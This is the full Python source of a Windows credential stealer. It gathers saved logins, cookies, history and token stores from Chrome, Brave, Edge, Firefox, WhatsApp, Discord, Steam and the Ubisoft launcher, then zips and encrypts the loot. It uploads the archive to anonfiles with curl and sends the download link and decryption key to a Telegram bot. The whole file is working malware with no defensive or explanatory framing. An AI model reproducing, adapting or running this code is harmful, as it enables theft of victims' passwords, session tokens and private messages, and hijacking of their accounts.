# Modules
import os,getpass,random,time,shutil,threading,subprocess,json,requests
from tkinter import*
from cryptography.fernet import Fernet
from zipfile import ZipFile
# AddOns
username = getpass.getuser()
key = Fernet.generate_key()
key_stripped = key.decode('utf-8')
fernet_gen = Fernet(key)
os.chdir(rf'C:\\Users\\{username}\\')
zip_name = "collection" + str(random.randint(100,10000)) + ".zip"
zip_name_firefox = "json" + str(random.randint(100,10000)) + ".zip"
zip_name_edge = "collection_edge" + str(random.randint(100,10000)) + ".zip"
zip_name_whatsapp = "collection_whatsapp" + str(random.randint(100,10000)) + ".zip"
zip_name_discord = "collection_discord" + str(random.randint(100,10000)) + ".zip"
zip_name_steam = "collection_steam" + str(random.randint(100,10000)) + ".zip"
zip_name_ubi = "collection_ubi" + str(random.randint(100,10000)) + ".zip"
cookies = ("Login Data","Extension Cookies","Bookmarks","History","Login Data For Account","Web Data","Secure Preferences","Media History","LOG","LOCK","DownloadMetadata")
# Dir_Compromised
if os.path.isdir('.vbsfiles') == False:
    os.mkdir('.vbsfiles')
elif os.path.isdir('.vbsfiles') == True:
    shutil.rmtree('.vbsfiles')
    os.mkdir('.vbsfiles')
os.chdir('.vbsfiles')
# Chrome
def chrome():
    global zip_name
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data") == True:
        dir_list_chrome = []
        dir_names = ("Default","Profile 1","Profile 2","Profile 3","Profile 4","Profile 5","Profile 6","Profile 7","Profile 8","Profile 9","Profile 10","Profile 11","Profile 12","Profile 13","Profile 14","Profile 15","Profile 16","Profile 17","Profile 18","Profile 19","Profile 20")
        for dir_name in dir_names:
            dir_path_chrome = rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name}"
            if os.path.isdir(dir_path_chrome) == True:
                dir_list_chrome.append(dir_name)
        for dir_name in dir_list_chrome:
            list_cookies = []
            for cookie in cookies:
                if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name}\\{cookie}") == True:
                    list_cookies.append(cookie)
            zip_name_new = dir_name+"-"+zip_name
            zip_name_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_new}'
            with ZipFile(zip_name_new,'w') as zip:
                for files in list_cookies:
                    files = (rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name}\\{files}")
                    zip.write(files)
                zip.close()
        for dir_name_ in dir_list_chrome:
            if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name_}\\Local Storage\\leveldb") == True:
                chrome_dir = os.scandir(rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name_}\\Local Storage\\leveldb")
                list_cookies_chrome = []
                for i in chrome_dir:
                    if "ldb" in i.name:
                        list_cookies_chrome.append(i.name)
                    zip_name_chrome = dir_name+"-Chrome-"+"-discord-token-"+zip_name
                    zip_name_chrome = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_chrome}'
                    with ZipFile(zip_name_chrome,'w') as zip_chrome:
                        for files in list_cookies_chrome:
                            files = (rf"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\{dir_name_}\\Local Storage\\leveldb\\{files}")
                            zip_chrome.write(files)
                        zip_chrome.close()
    global Chrome_state
    Chrome_state = True
# Firefox
def firefox():
    global zip_name_firefox
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles") == True:
        location_files = rf"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        json_file = ("logins.json","cookies.sqlite",'logins-backup.json','key4.db','storage.sqlite','extensions.json')
        dirs_name = os.scandir(location_files)
        for i in dirs_name:
            list_jsons = []
            if i.is_dir() and ".default-release" in i.name:
                dir = rf"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{i.name}"
                for jsons in json_file:
                    file_path_json = dir + f"\\{jsons}"
                    if os.path.isfile(file_path_json) == True:
                        list_jsons.append(file_path_json)
                zip_name_firefox_new = i.name+"-"+zip_name_firefox
                zip_name_firefox_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_firefox_new}'
                with ZipFile(zip_name_firefox_new,'w') as zip_firefox:
                    for files in list_jsons:
                        zip_firefox.write(files)
                    zip_firefox.close()
    global Firefox_state
    Firefox_state = True
#Brave
def Brave():
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data") == True:
        dir_brave = []
        dir_names = ("Default","Profile 1","Profile 2","Profile 3","Profile 4","Profile 5","Profile 6","Profile 7","Profile 8","Profile 9","Profile 10","Profile 11","Profile 12","Profile 13","Profile 14","Profile 15","Profile 16","Profile 17","Profile 18","Profile 19","Profile 20")
        for dir_name in dir_names:
            dir_path_brave = rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name}"
            if os.path.isdir(dir_path_brave) == True:
                dir_brave.append(dir_name)
        for dir_name in dir_brave:
            list_cookies_brave = []
            for cookies_brave in cookies:
                if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name}\\{cookies_brave}") == True:
                    list_cookies_brave.append(cookies_brave)
                zip_name_brave = dir_name+"-Brave-Browser"+zip_name
                zip_name_brave = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_brave}'
            with ZipFile(zip_name_brave,'w') as zip_brave:
                for files in list_cookies_brave:
                    files = (rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name}\\{files}")
                    zip_brave.write(files)
                zip_brave.close()
            for dir_name_ in dir_brave:
                if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name_}\\Local Storage\\leveldb") == True:
                    brave_dir = os.scandir(rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name_}\\Local Storage\\leveldb")
                    list_cookies_brave_2 = []
                    for i in brave_dir:
                        if ".ldb" in i.name:
                            list_cookies_brave_2.append(i.name)
                        zip_name_brave_2 = dir_name+"-Brave-"+"-discord-token-"+zip_name
                        zip_name_brave_2 = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_brave_2}'
                        with ZipFile(zip_name_brave_2,'w') as zip_brave_2:
                            for files_2 in list_cookies_brave_2:
                                files_2 = (rf"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\{dir_name_}\\Local Storage\\leveldb\\{files_2}")
                                zip_brave_2.write(files_2)
                            zip_brave_2.close()
    global Brave_state
    Brave_state = True
# Edge
def Edge():
    global zip_name_edge
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data") == True:
        dir_list_edge = []
        dir_edge = ("Default","Profile 1","Profile 2","Profile 3","Profile 4","Profile 5","Profile 6","Profile 7","Profile 8","Profile 9","Profile 10","Profile 11","Profile 12","Profile 13","Profile 14","Profile 15","Profile 16","Profile 17","Profile 18","Profile 19","Profile 20")
        for dir_name in dir_edge:
            dir_path_edge = rf"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\{dir_name}"
            if os.path.isdir(dir_path_edge) == True:
                dir_list_edge.append(dir_name)
        for dir_name_edge in dir_list_edge:
            list_cookies_edge = []
            for cookie in cookies:
                if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\{dir_name_edge}\\{cookie}") == True:
                    list_cookies_edge.append(cookie)
            zip_name_edge_new = dir_name_edge+"-"+zip_name_edge
            zip_name_edge_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_edge_new}'
            with ZipFile(zip_name_edge_new,'w') as zip_edge:
                for files in list_cookies_edge:
                    files = (rf"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\{dir_name_edge}\\{files}")
                    zip_edge.write(files)
                zip_edge.close()
    global Edge_state
    Edge_state = True
# Whatsapp
def Whatsapp():
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Roaming\\WhatsApp") == True:
        list_cookies_whatsapp = []
        cookies_whatsapp = ("Cookies","Preferences","TransportSecurity","settings.json","main-process.log.0","main-process.log.1","main-process.log.2","main-process.log.3","main-process.log.4","main-process.log.5","main-process.log.6","main-process.log.7","main-process.log.8","main-process.log.9","main-process.log.10","main-process.log.11","main-process.log.12","main-process.log.13","main-process.log.14","main-process.log.15")
        for cookies in cookies_whatsapp:
            if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Roaming\\WhatsApp\\{cookies}") == True:
                list_cookies_whatsapp.append(cookies)
            zip_name_whatsapp_new = zip_name_whatsapp
            zip_name_whatsapp_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_whatsapp_new}'
            with ZipFile(zip_name_whatsapp_new,'w') as zip_whatsapp:
                for files in list_cookies_whatsapp:
                    files = (rf"C:\\Users\\{username}\\AppData\\Roaming\\WhatsApp\\{files}")
                    zip_whatsapp.write(files)
                zip_whatsapp.close()
    global Whatsapp_state
    Whatsapp_state = True
# Discord
def Discord():
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord") == True:
        list_cookies_discord = []
        cookies_discord = ("Cookies","Preferences","TransportSecurity","Local State")
        discord = os.scandir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord")
        for i in discord:
            if i.is_file and ".tmp" in i.name:
                list_cookies_discord.append(i.name) 
        for cookies in cookies_discord:
            if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\{cookies}") == True:
                list_cookies_discord.append(cookies)
        zip_name_new_discord = zip_name_discord
        zip_name_new_discord =  rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_new_discord}'
        with ZipFile(zip_name_new_discord,'w') as zip_discord:
            for files in list_cookies_discord:
                files = (rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\{files}")
                zip_discord.write(files)
            zip_discord.close()
        if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Session Storage") == True:
            list_cookies_discord_2 = []
            discord_2 = os.scandir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Session Storage")
            for i in discord_2:
                if i.is_dir and ".ldb" in i.name:
                    list_cookies_discord_2.append(i.name)
                if "MANIFEST" in i.name:
                    list_cookies_discord_2.append(i.name)
            zip_name_new_discord_2 = "Session-" + zip_name_discord
            zip_name_new_discord_2 = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_new_discord_2}'
            with ZipFile(zip_name_new_discord_2,'w') as zip_discord_2:
                for files in list_cookies_discord_2:
                    files = (rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Session Storage\\{files}")
                    zip_discord_2.write(files)
                zip_discord_2.close()
        if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb"):
            list_cookies_discord_3 = []
            discord_3 = os.scandir(rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb")
            for i in discord_3:
                if i.is_dir and ".ldb" in i.name:
                    list_cookies_discord_3.append(i.name)
                if "MANIFEST" in i.name:
                    list_cookies_discord_3.append(i.name)
            zip_name_new_discord_3 = "leveldb-" + zip_name_discord
            zip_name_new_discord_3 = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_new_discord_3}'
            with ZipFile(zip_name_new_discord_3,'w') as zip_discord_3:
                for files in list_cookies_discord_3:
                    files = (rf"C:\\Users\\{username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{files}")
                    zip_discord_3.write(files)
                zip_discord_3.close()
    global Discord_state
    Discord_state = True
# Steam
def Steam():
    if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache") == True:
        list_cookies_steam = []
        cookies_steam = ("LocalPrefs.json","UserPrefs.json","TransportSecurity","Cookies")
        for cookies in cookies_steam:
            if os.path.isfile(rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache\\{cookies}") == True:
                list_cookies_steam.append(cookies)
            zip_name_steam_new = zip_name_steam
            zip_name_steam_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_steam_new}'
            with ZipFile(zip_name_steam_new,'w') as zip_steam:
                for files in list_cookies_steam:
                    files = (rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache\\{files}")
                    zip_steam.write(files)
                zip_steam.close()
        if os.path.isdir(rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache\\Session Storage") == True:
            list_cookies_steam_2 = []
            steam = os.scandir(rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache\\Session Storage")
            for i in steam:
                if i.is_file and ".log" in i.name:
                    list_cookies_steam_2.append(i.name)
            zip_name_steam_2 = "Session-" + zip_name_steam
            zip_name_steam_2 = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_steam_2}'
            with ZipFile(zip_name_steam_2,'w') as zip_steam_2:
                for files in list_cookies_steam_2:
                    files = (rf"C:\\Users\\{username}\\AppData\\Local\\Steam\\htmlcache\\Session Storage\\{files}")
                    zip_steam_2.write(files)
                zip_steam_2.close()
    global Steam_state
    Steam_state = True
# Ubi
def Ubi():
    if os.path.isdir(rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache") == True:
        list_dir_ubi = []
        list_cookies_ubi = []
        cookies_ubi = ("LocalPrefs.json","UserPrefs.json","TransportSecurity","Cookies")
        Ubisoft = os.scandir(rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache")
        for i in Ubisoft:
            if i.is_dir and "http" in i.name:
                list_dir_ubi.append(i.name)
        for dir in list_dir_ubi:
            for cookies in cookies_ubi:
                if os.path.isfile(rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache\\{dir}\\{cookies}") == True:
                    list_cookies_ubi.append(cookies)
                zip_name_ubi_new = zip_name_ubi
                zip_name_ubi_new = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_ubi_new}'
                with ZipFile(zip_name_ubi_new,'w') as zip_ubi:
                    for files in list_cookies_ubi:
                        files = rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache\\{dir}\\{files}"
                        zip_ubi.write(files)
                    zip_ubi.close()
            if os.path.isdir(rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache\\{dir}\\Session Storage") == True:
                list_cookies_ubi_2 = []
                Ubisoft_2 = os.scandir(rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache\\{dir}\\Session Storage")
                for i in Ubisoft_2:
                    if i.is_file and ".log" in i.name:
                        list_cookies_ubi_2.append(i.name)
                zip_name_ubi_2 = "Session-" + zip_name_ubi
                zip_name_ubi_2 = rf'C:\\Users\\{username}\\.vbsfiles\\{zip_name_ubi_2}'
                with ZipFile(zip_name_ubi_2,'w') as zip_ubi_2:
                    for files in list_cookies_ubi_2:
                        files = (rf"C:\\Program Files (x86)\\Ubisoft\\Ubisoft Game Launcher\\cache\\{dir}\\Session Storage\\{files}")
                        zip_ubi_2.write(files)
                    zip_ubi_2.close()
    global Ubi_state
    Ubi_state = True
# Compromised ZIPs Combined
def sending():
    global Full_Zip_State
    Full_Zip_State = False
    while Full_Zip_State == False:
        time.sleep(2)
        if Edge_state == True and Chrome_state == True and Firefox_state == True and Whatsapp_state == True and Discord_state == True and Steam_state == True and Ubi_state == True and Brave_state == True:
            with ZipFile(f'All_Data-{str(random.randint(100,10000))}.zip','w') as zip_full:
                for i in os.listdir():
                    zip_full.write(i)
                zip_full.close()
            Full_Zip_State = True
# Deleteing extra zips
def Delete():
    global Delete_state
    Delete_state = False
    while Delete_state == False:
        time.sleep(3)
        if Full_Zip_State == True:
            dir_zips = os.scandir(rf"C:\\Users\\{username}\\.vbsfiles")
            for i in dir_zips:
                if i.is_dir and "All_Data" not in i.name:
                    os.remove(rf"C:\\Users\\{username}\\.vbsfiles\\{i.name}")
        Delete_state = True
# Uploading
def uploading():
    global upload_state
    upload_state = False
    while upload_state == False:
        time.sleep(0.5)
        if Delete_state == True:
            dir_zip = os.scandir(rf"C:\\Users\\{username}\\.vbsfiles")
            for i in dir_zip:
                if i.is_file and "All_Data" in i.name:
                    files = open(i.name,"rb+")
                    file_contents = files.read()
                    files.truncate(0)
                    files.seek(0)
                    files_encrypted = fernet_gen.encrypt(file_contents)
                    files.write(files_encrypted)
                    files.close()
                    file_path = rf"file=@C:\\Users\\{username}\\.vbsfiles\\{i.name}"
                    url_send ="https://api.anonfiles.com/upload"
                    send = subprocess.run(['curl','-F',file_path,url_send],shell=True,capture_output=True).stdout.decode()
                    with open(rf"C:\\Users\\{username}\\.vbsfiles\\link.json","w") as lol:
                        lol.write(send)
                    lol.close()
                    with open(rf"C:\\Users\\{username}\\.vbsfiles\\link.json","r") as lol:
                        data = json.load(lol)
                    lol.close()
                url = data["data"]["file"]["url"]["full"]
                s = requests.Session()
                # s.proxies = {'https':'Proxy'}
                response_ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=The Link To The Encrypted File: {url}')
                response__ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=Your Decryption KEY is: {key_stripped}')
                response___ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=The Link To The Decryption Software : https://github.com/Wolf-Of-Wall-Street/Project-NewWorld/blob/main/Decryption_Software.py')
            upload_state = True

# Threads
chrome_thread = threading.Thread(target=chrome)
firefox_thread = threading.Thread(target=firefox)
brave_thread = threading.Thread(target=Brave)
edge_thread = threading.Thread(target=Edge)
whatsapp_thread = threading.Thread(target=Whatsapp)
discord_thread = threading.Thread(target=Discord)
steam_thread = threading.Thread(target=Steam)
ubi_thread = threading.Thread(target=Ubi)
sending_thread = threading.Thread(target=sending)
delete_threading = threading.Thread(target=Delete)
uploading_thread = threading.Thread(target=uploading)
firefox_thread.start()
chrome_thread.start()
brave_thread.start()
edge_thread.start()
whatsapp_thread.start()
discord_thread.start()
steam_thread.start()
ubi_thread.start()
sending_thread.start()
delete_threading.start()
uploading_thread.start()



          
